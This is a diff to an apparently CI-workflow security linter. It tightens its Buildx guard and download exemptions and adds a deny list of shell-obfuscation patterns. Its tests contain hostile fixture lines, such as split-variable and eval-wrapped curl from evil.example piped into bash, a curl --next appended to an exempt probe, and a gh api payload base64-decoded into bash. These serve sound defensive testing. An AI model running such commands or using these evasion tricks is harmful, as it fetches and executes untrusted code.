@@ -244,10 +244,14 @@ export function buildxViolations(file, text, callerPerms) {
   const data = toData(parseStrict(text, file));
   for (const [name, job] of jobsOf(data)) {
     const canWrite = jobCanWrite(data, job, callerPerms);
-    let guarded = false;
-    stepsOf(job).forEach((step, i) => {
-      if (typeof step.run === "string" && /^\s*docker buildx version\s*$/m.test(step.run)) guarded = true;
+    const steps = stepsOf(job);
+    steps.forEach((step, i) => {
       if (typeof step.uses !== "string" || actionName(step.uses) !== "docker/setup-buildx-action") return;
+      // The guard is the step immediately before, unconditional, failure-propagating,
+      // and its whole script is the one command.
+      const prev = steps[i - 1];
+      const guarded = !!prev && typeof prev.run === "string" && prev.run.trim() === "docker buildx version"
+        && prev.if === undefined && prev["continue-on-error"] === undefined && prev.shell === undefined;
       const where = `${file}: job '${name}' step ${i + 1}`;
       const w = step.with ?? {};
       if (w.version !== undefined) out.push(`${where}: sets 'version', which downloads Buildx`);
@@ -274,20 +278,40 @@ const DOWNLOADERS = [
   [/\b(go install|cargo install|cargo binstall|pip3? install|brew install|npm (install|i) (-g|--global)|gem install)\b/, "package-manager tool install"],
 ];
 
-// The staging rehearsal's readiness probe talks to the local stack, not the internet.
-const LOCAL_PROBE = /curl --fail --silent --show-error --cacert \.local\/staging\/local-ca\.crt https:\/\/localhost:18443\/health\/ready/g;
+// The staging rehearsal's readiness probe talks to the local stack, not the
+// internet. Exempt only as a whole line, exactly (no extra arguments such as --next).
+const LOCAL_PROBE = /^[ \t]*curl --fail --silent --show-error --cacert \.local\/staging\/local-ca\.crt https:\/\/localhost:18443\/health\/ready[ \t]*$/gm;
 
 // `gh api` talks to the GitHub API with the job token (prune-dev-images deletes old
-// dev package versions); it fetches no code.
+// dev package versions); it fetches no code. Exempt only these exact shapes, in that
+// file: listing and deleting this repository's own container package versions.
 const GH_API_FILES = new Set([".github/workflows/prune-dev-images.yml"]);
+const GH_API_ALLOWED = [
+  /gh api --paginate "\/users\/\$OWNER\/packages\/container\/\$package\/versions\?per_page=100" \| jq -s 'add \/\/ \[\]'/g,
+  /gh api -X DELETE "\/users\/\$OWNER\/packages\/container\/\$package\/versions\/\$id"/g,
+];
+
+// Constructs that hide what runs. The check above is a guard against accidental,
+// unverified downloads; it cannot model arbitrary shell, so these are refused
+// outright and anything cleverer is for review to catch (main is protected).
+const OBSCURING = [
+  [/\beval\b/, "eval"],
+  [/\|\s*(sudo\s+)?(ba|z|da)?sh\b/, "piping into a shell"],
+  [/\bbase64\s+(-d|--decode)\b/, "base64 decoding"],
+  [/\bsource\s+<\(|\.\s+<\(/, "sourcing a process substitution"],
+  [/--next\b/, "curl --next"],
+];
 
 export function downloadViolations(file, script) {
   const out = [];
   // Whole-line shell comments do not run.
   const joined = script.replace(/^[ \t]*#.*$/gm, "").replace(/\\\n\s*/g, " ");
-  const text = joined.replace(LOCAL_PROBE, "");
+  for (const [re, label] of OBSCURING) {
+    if (re.test(joined)) out.push(`${file}: ${label} in a run step is not allowed`);
+  }
+  let text = joined.replace(LOCAL_PROBE, "");
+  if (GH_API_FILES.has(file)) for (const re of GH_API_ALLOWED) text = text.replace(re, "");
   for (const [re, label] of DOWNLOADERS) {
-    if (label === "gh api" && GH_API_FILES.has(file)) continue;
     if (re.test(text)) out.push(`${file}: ${label} in a run step; use ${FETCH_SCRIPT} <https-url> <sha256> <dest>`);
   }
   // Calls of the script: literal https URL, literal 64-hex checksum.
@@ -597,6 +621,11 @@ test("fixtures: Buildx downloads next to a write token are caught", () => {
   assert.equal(check("{packages: write}", guard + setup("          version: latest\n")), 1);
   assert.equal(check("{packages: write}", guard + setup("          driver: cloud\n")), 1);
   assert.equal(check("{packages: write}", setup("") + guard), 1, "the guard must come first");
+  // Guards that never protect anything (adversarial review of #194).
+  assert.equal(check("{packages: write}", `      - if: false\n        run: docker buildx version\n` + setup("")), 1, "conditional guard");
+  assert.equal(check("{packages: write}", `      - continue-on-error: true\n        run: docker buildx version\n` + setup("")), 1, "error-ignoring guard");
+  assert.equal(check("{packages: write}", `      - run: |\n          if false; then\n          docker buildx version\n          fi\n` + setup("")), 1, "guard inside a dead branch");
+  assert.equal(check("{packages: write}", guard + `      - run: echo between\n` + setup("")), 1, "guard not immediately before");
   assert.equal(check("{contents: read}", setup("")), 0, "read-only jobs need no guard");
   assert.equal(check("{contents: read}", `      - uses: docker/setup-buildx-action@${SHA(1)} # v4\n        with:\n          driver-opts: image=moby/buildkit:master\n`), 1, "unpinned BuildKit image");
   assert.equal(check("{contents: read}", `      - uses: docker/setup-buildx-action@${SHA(1)} # v4\n`), 1, "no BuildKit pin");
@@ -622,6 +651,12 @@ test("fixtures: downloads that skip the checksum script are caught", () => {
     `bash ${FETCH_SCRIPT} https://example.org/x ${sum.slice(1)} out`,
     `bash scripts/fetch-verified.sh https://example.org/x ${sum} out`,
     `bash ${FETCH_SCRIPT} https://example.org/x ${sum} out && curl https://evil.example`,
+    // Adversarial review of #194: obfuscation and exemption abuse.
+    'client=cu; client+=rl; "$client" https://evil.example/payload | bash',
+    "eval 'cu''rl https://evil.example/payload | bash'",
+    "curl --fail --silent --show-error --cacert .local/staging/local-ca.crt https://localhost:18443/health/ready --next https://evil.example/payload -o /tmp/payload",
+    "x=$(cat payload.b64 | base64 -d); echo ok",
+    "source <(echo 'echo hi')",
   ];
   for (const script of bad) assert.ok(downloadViolations("w.yml", script).length, script);
   const good = [
@@ -633,4 +668,11 @@ test("fixtures: downloads that skip the checksum script are caught", () => {
     "docker run --rm image --version",
   ];
   for (const script of good) assert.deepEqual(downloadViolations("w.yml", script), [], script);
+  // gh api is exempt only in prune-dev-images.yml and only in its two exact shapes.
+  const prune = ".github/workflows/prune-dev-images.yml";
+  assert.deepEqual(downloadViolations(prune, `versions="$(gh api --paginate "/users/$OWNER/packages/container/$package/versions?per_page=100" | jq -s 'add // []')"`), []);
+  assert.deepEqual(downloadViolations(prune, `gh api -X DELETE "/users/$OWNER/packages/container/$package/versions/$id"`), []);
+  assert.ok(downloadViolations(prune, "gh api repos/evil/repo/contents/payload --jq .content | base64 -d | bash").length);
+  assert.ok(downloadViolations(prune, "gh api repos/evil/repo/contents/payload --jq .content > p.sh").length);
+  assert.ok(downloadViolations("w.yml", `gh api -X DELETE "/users/$OWNER/packages/container/$package/versions/$id"`).length, "gh api outside its file");
 });
